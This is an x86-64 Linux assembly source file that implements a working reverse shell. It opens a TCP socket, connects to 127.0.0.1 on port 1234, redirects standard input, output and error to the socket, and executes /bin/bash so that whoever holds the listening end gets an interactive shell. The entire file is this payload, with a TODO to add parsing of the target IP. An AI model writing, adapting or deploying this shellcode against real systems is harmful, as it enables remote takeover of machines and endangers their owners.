global _start

%define AF_INET 2
%define EXIT 60
%define SOCKET 41
%define CONNECT 42
%define DUP2 33
%define SOCK_STREAM 1
%define EXECVE 59

%define PORT 1234

section .text

_start:
    push rbp
    mov rbp, rsp
    sub rsp, 16

    mov ax, PORT
    xchg ah, al

    ; TODO: Implement ip string to binary
    mov word  [rsp],   AF_INET
    mov word  [rsp+2], ax
    mov dword [rsp+4], 16777343 ; 127.0.0.1 in binary
    mov dword [rsp+8], 0 ; padding

    mov rdi, AF_INET
    mov rsi, SOCK_STREAM
    mov rdx, 0
    mov rax, SOCKET
    syscall

    mov dword [s], eax

    mov rdi, [s]
    lea rsi, [rsp]
    mov rdx, 16
    mov rax, CONNECT
    syscall

    mov rdi, [s]
    mov rsi, 0
    mov rax, DUP2
    syscall

    mov rdi, [s]
    mov rsi, 1
    mov rax, DUP2
    syscall

    mov rdi, [s]
    mov rsi, 2
    mov rax, DUP2
    syscall

    lea rdi, [binary]
    lea rsi, [argv]
    xor rdx, rdx
    mov rax, EXECVE
    syscall

    leave
    xor rdi, rdi
    mov rax, EXIT
    syscall

section .data
s: dd 0
binary: db "/bin/bash", 0
argv: dq binary, 0
